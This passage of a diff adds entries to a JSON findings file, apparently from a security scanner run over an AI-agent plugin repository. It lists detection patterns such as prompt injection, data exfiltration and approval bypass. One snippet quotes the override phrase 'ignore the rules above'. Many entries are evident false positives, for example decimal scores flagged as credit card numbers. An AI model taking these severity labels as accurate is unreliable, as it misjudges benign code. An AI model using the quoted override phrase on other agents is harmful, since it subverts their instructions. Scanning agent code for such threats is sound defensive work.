+  "ctx": "...     \"frontmatter_quality\": 0.5599999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1049,
+  "ctx": "\"token_efficiency\": 0.8820717131474104"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1221,
+  "ctx": "\"static_score\": 0.6716622641509434,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1341,
+  "ctx": "\"static_score\": 0.7597689655172414,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1364,
+  "ctx": "\"token_efficiency\": 0.9644444444444444"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1401,
+  "ctx": "\"static_score\": 0.6614340425531915,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1464,
+  "ctx": "...     \"frontmatter_quality\": 0.5599999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1476,
+  "ctx": "\"static_score\": 0.7153435643564356,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1551,
+  "ctx": "\"static_score\": 0.7804966101694915,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1574,
+  "ctx": "\"token_efficiency\": 0.9955555555555555"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1579,
+  "ctx": "\"composite\": 80.4335260115607,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1604,
+  "ctx": "\"token_efficiency\": 0.9913978494623656"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1624,
+  "ctx": "\"composite\": 82.4055944055944,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1776,
+  "ctx": "\"static_score\": 0.7294542372881356,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1806,
+  "ctx": "\"static_score\": 0.7027545454545454,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1841,
+  "ctx": "...    \"orchestration_wiring\": 0.5499999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1856,
+  "ctx": "...    \"orchestration_wiring\": 0.5499999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1886,
+  "ctx": "...    \"orchestration_wiring\": 0.5499999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 1964,
+  "ctx": "\"token_efficiency\": 0.9562841530054644"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2031,
+  "ctx": "\"static_score\": 0.7865724137931035,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2084,
+  "ctx": "\"token_efficiency\": 0.932972972972973"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2106,
+  "ctx": "\"static_score\": 0.757972972972973,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2144,
+  "ctx": "\"token_efficiency\": 0.9444444444444444"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2179,
+  "ctx": "\"composite\": 67.4891774891775,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2301,
+  "ctx": "\"static_score\": 0.6614340425531915,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2361,
+  "ctx": "\"static_score\": 0.7512601156069364,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2414,
+  "ctx": "\"token_efficiency\": 0.9450643776824035"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2469,
+  "ctx": "...     \"frontmatter_quality\": 0.5599999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2519,
+  "ctx": "\"token_efficiency\": 0.9644444444444444"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2549,
+  "ctx": "\"token_efficiency\": 0.9737991266375545"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2559,
+  "ctx": "...     \"frontmatter_quality\": 0.5599999999999999,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2639,
+  "ctx": "\"token_efficiency\": 0.9782608695652174"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2654,
+  "ctx": "\"token_efficiency\": 0.8852830188679245"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2676,
+  "ctx": "\"static_score\": 0.7588330049261084,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "evals/static-score-snapshot.json",
+  "category": "Data Exfiltration",
+  "pattern": "Credit Card Number (LLM06)",
+  "severity": "Severity.CRITICAL",
+  "line": 2744,
+  "ctx": "\"token_efficiency\": 0.9363636363636364"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "Makefile",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 85,
+  "ctx": "brew install tesseract ffmpeg; \\"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "Makefile",
+  "category": "Dangerous Command",
+  "pattern": "Remote Code Execution",
+  "severity": "Severity.CRITICAL",
+  "line": 229,
+  "ctx": "...in-eval && uv run --extra dev python -c \"from pathlib import Path; from plugin_eval.snapshot import build_snapshot, write_snapshot; write_snapshot(Path('../."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/agent-orchestration/commands/multi-agent-optimize.md",
+  "category": "Code Obfuscation",
+  "pattern": "Python Magic Attributes",
+  "severity": "Severity.CRITICAL",
+  "line": 68,
+  "ctx": "...    performance_profile[agent.__class__.__name__] = agent.profile()"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/agent-teams/skills/multi-reviewer-patterns/references/review-dimensions.md",
+  "category": "Data Exfiltration",
+  "pattern": "Env Variable Output Exfiltration",
+  "severity": "Severity.HIGH",
+  "line": 0,
+  "ctx": "...- [ ] Secrets are loaded from environment variables or secret manager - [ ] .gitignore includes sensitive file patterns - [ ..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/agent-teams/skills/parallel-debugging/SKILL.md",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...data - Type mismatch or coercion error - Null/undefined/None where value expected - Encoding or serialization problem - Data truncation or overflow ### 3. St"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/agent-teams/skills/team-composition-patterns/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Instruction Reset",
+  "severity": "Severity.HIGH",
+  "line": 136,
+  "ctx": "...text in the prompt. Teammates start fresh with no prior conversation history — they need all relev..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/api-scaffolding/skills/fastapi-templates/references/details.md",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 417,
+  "ctx": "payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[ALGORITHM])"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/api-testing-observability/commands/api-mock.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 650,
+  "ctx": "with open(contract_path, 'r') as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/application-performance/commands/performance-optimization.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Instruction Reset",
+  "severity": "Severity.HIGH",
+  "line": 35,
+  "ctx": "2. Start fresh (archives existing session)"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/avoid-ai-writing/skills/avoid-ai-writing/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Broad Ignore Instructions (EN)",
+  "severity": "Severity.CRITICAL",
+  "line": 22,
+  "ctx": "...ent that tells its editor to \"ignore the rules above\" gets that sentence fla..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/commands/feature-development.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Instruction Reset",
+  "severity": "Severity.HIGH",
+  "line": 35,
+  "ctx": "2. Start fresh (archives existing session)"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/api-design-principles/assets/api-design-checklist.md",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 0,
+  "ctx": "...TP Methods - [ ] GET for retrieval (safe, idempotent) - [ ] POST for creation - [ ] PUT for full replacement (idempotent) - [ ] PATCH for partial updat..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/api-design-principles/assets/api-design-checklist.md",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 15,
+  "ctx": "- [ ] GET for retrieval (safe, idempotent)"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/api-design-principles/assets/rest-api-template.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python Magic Attributes",
+  "severity": "Severity.CRITICAL",
+  "line": 91,
+  "ctx": "error=exc.__class__.__name__,"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/architecture-patterns/references/advanced-patterns.md",
+  "category": "Code Obfuscation",
+  "pattern": "Python Magic Attributes",
+  "severity": "Severity.CRITICAL",
+  "line": 336,
+  "ctx": "...             json.dumps(event.__dict__, default=str),"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/microservices-patterns/references/details.md",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 228,
+  "ctx": "...alizer=lambda v: json.loads(v.decode()),"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/projection-patterns/SKILL.md",
+  "category": "Agentic Security",
+  "pattern": "Error Handler Bypass (ASI08 Precursor)",
+  "severity": "Severity.HIGH",
+  "line": 0,
+  "ctx": "...Each is independent - **Don't skip error handling** - Log and alert on failu..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/projection-patterns/SKILL.md",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "... Current state queries  | | **Catchup**    | Process historical events   | Rebuilding read models | | **Persistent** | Stores checkpoint           | Resume a"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/temporal-python-testing/resources/local-setup.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 69,
+  "ctx": "open http://localhost:8080"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/temporal-python-testing/resources/local-setup.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 502,
+  "ctx": "# Access Web UI at http://localhost:8080"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/temporal-python-testing/resources/replay-testing.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 200,
+  "ctx": "with open(output_file, \"wb\") as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/temporal-python-testing/resources/replay-testing.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 216,
+  "ctx": "with open(\"workflow_histories/order-123.p..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/temporal-python-testing/resources/replay-testing.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 296,
+  "ctx": "with open(filename, \"wb\") as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/backend-development/skills/temporal-python-testing/resources/replay-testing.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 333,
+  "ctx": "with open(history_file, \"rb\") as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/block-no-verify/commands/block-no-verify.md",
+  "category": "Code Obfuscation",
+  "pattern": "Python Dangerous File I/O",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...n3 -c \"import json; json.load(open('.claude/settings.json'))\" 2>&1 || echo \"Invalid JSON\" # Display the configured hooks cat .claude/settings.json ``` ### 5."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/block-no-verify/commands/block-no-verify.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 73,
+  "ctx": "...n3 -c \"import json; json.load(open('.claude/settings.json'))\" 2>&1..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/blockchain-web3/skills/defi-protocol-templates/references/details.md",
+  "category": "Code Obfuscation",
+  "pattern": "Base64 Decode-and-Follow Command",
+  "severity": "Severity.HIGH",
+  "line": 183,
+  "ctx": "// Decode params and execute arbitrage, liquidation, etc."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/business-analytics/skills/data-storytelling/SKILL.md",
+  "category": "Social Engineering",
+  "pattern": "Confidentiality Trap",
+  "severity": "Severity.MEDIUM",
+  "line": 60,
+  "ctx": "- **Show, don't tell** - Let data speak"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/c4-architecture/commands/c4-architecture.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 179,
+  "ctx": "[List of deployment config files: Dockerfiles, K8s manif..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cicd-automation/commands/workflow-automate.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 68,
+  "ctx": "with open(workflow_file) as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cicd-automation/commands/workflow-automate.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 80,
+  "ctx": "with open(gitlab_ci) as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cicd-automation/skills/deployment-pipeline-design/references/advanced-strategies.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 528,
+  "ctx": "curl -sf http://localhost:8080/health/ready"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cicd-automation/skills/gitlab-ci-patterns/SKILL.md",
+  "category": "Social Engineering",
+  "pattern": "Approval Bypass (LLM08)",
+  "severity": "Severity.HIGH",
+  "line": 178,
+  "ctx": "- terraform apply -auto-approve tfplan"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cicd-automation/skills/gitlab-ci-patterns/SKILL.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 108,
+  "ctx": "- kubectl config set-credentials admin --token=\"$KUBE_TOKEN\""
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cicd-automation/skills/secrets-management/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 61,
+  "ctx": "export VAULT_ADDR='http://127.0.0.1:8200'"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cicd-automation/skills/secrets-management/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 164,
+  "ctx": "password            = jsondecode(data.aws_secretsmanager_secret_version.db_password.secret_string)[\"password\"]"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/hybrid-cloud-networking/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 43,
+  "ctx": "ip_address = \"203.0.113.1\""
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/hybrid-cloud-networking/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 165,
+  "ctx": "- Advertise: 10.0.0.0/8"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/linkerd-patterns/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 204,
+  "ctx": "- cidr: 10.0.0.0/8"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/linkerd-patterns/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 306,
+  "ctx": "- **Don't skip check** - Always run `linkerd chec..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/mtls-configuration/references/details.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 147,
+  "ctx": "bind_address = \"0.0.0.0\""
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/mtls-configuration/SKILL.md",
+  "category": "Social Engineering",
+  "pattern": "Approval Bypass (LLM08)",
+  "severity": "Severity.HIGH",
+  "line": 73,
+  "ctx": "- **Don't skip verification** - Verify the full chain"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/mtls-configuration/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 73,
+  "ctx": "- **Don't skip verification** - Verify the full chain"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/service-mesh-observability/references/details.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 238,
+  "ctx": "endpoint: 0.0.0.0:4317"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/service-mesh-observability/references/details.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 240,
+  "ctx": "endpoint: 0.0.0.0:4318"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/service-mesh-observability/references/details.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 242,
+  "ctx": "endpoint: 0.0.0.0:9411"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/service-mesh-observability/references/details.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 254,
+  "ctx": "endpoint: 0.0.0.0:8889"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/terraform-module-library/references/oci-modules.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 47,
+  "ctx": "...efer NSGs over broad security list rules where practical"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/terraform-module-library/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 190,
+  "ctx": "cidr_block         = \"10.0.0.0/16\""
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/terraform-module-library/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 194,
+  "ctx": "\"10.0.1.0/24\","
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/terraform-module-library/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 195,
+  "ctx": "\"10.0.2.0/24\","
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/cloud-infrastructure/skills/terraform-module-library/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 196,
+  "ctx": "\"10.0.3.0/24\""
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/code-documentation/agents/tutorial-engineer.md",
+  "category": "Social Engineering",
+  "pattern": "Confidentiality Trap",
+  "severity": "Severity.MEDIUM",
+  "line": 60,
+  "ctx": "- **Show, Don't Tell**: Demonstrate with code, the..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/code-documentation/commands/doc-generate.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 92,
+  "ctx": "with open(code_path, 'r') as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/code-documentation/commands/doc-generate.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 130,
+  "ctx": "with open(file_path, 'r') as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/code-documentation/commands/doc-generate.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 635,
+  "ctx": "...           module = ast.parse(open(file_path).read())"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/code-refactoring/commands/refactor-clean.md",
+  "category": "Code Obfuscation",
+  "pattern": "Python Dangerous File I/O",
+  "severity": "Severity.CRITICAL",
+  "line": 346,
+  "ctx": "log_file = open('/var/log/orders.log', 'a')"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/code-refactoring/commands/refactor-clean.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 346,
+  "ctx": "log_file = open('/var/log/orders.log', 'a')"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/codebase-cleanup/commands/refactor-clean.md",
+  "category": "Code Obfuscation",
+  "pattern": "Python Dangerous File I/O",
+  "severity": "Severity.CRITICAL",
+  "line": 346,
+  "ctx": "log_file = open('/var/log/orders.log', 'a')"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/codebase-cleanup/commands/refactor-clean.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 346,
+  "ctx": "log_file = open('/var/log/orders.log', 'a')"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/comprehensive-review/commands/full-review.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Instruction Reset",
+  "severity": "Severity.HIGH",
+  "line": 35,
+  "ctx": "2. Start fresh (archives existing session)"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/commands/implement.md",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Header Injection",
+  "severity": "Severity.CRITICAL",
+  "line": 362,
+  "ctx": "## Critical Rules"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/commands/implement.md",
+  "category": "Social Engineering",
+  "pattern": "Approval Bypass (LLM08)",
+  "severity": "Severity.HIGH",
+  "line": 364,
+  "ctx": "1. **NEVER skip verification checkpoints** - Always wait f..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/commands/implement.md",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 364,
+  "ctx": "1. **NEVER skip verification checkpoints** - Always wait fo..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/commands/manage.md",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Header Injection",
+  "severity": "Severity.CRITICAL",
+  "line": 1115,
+  "ctx": "## Critical Rules"
+ },
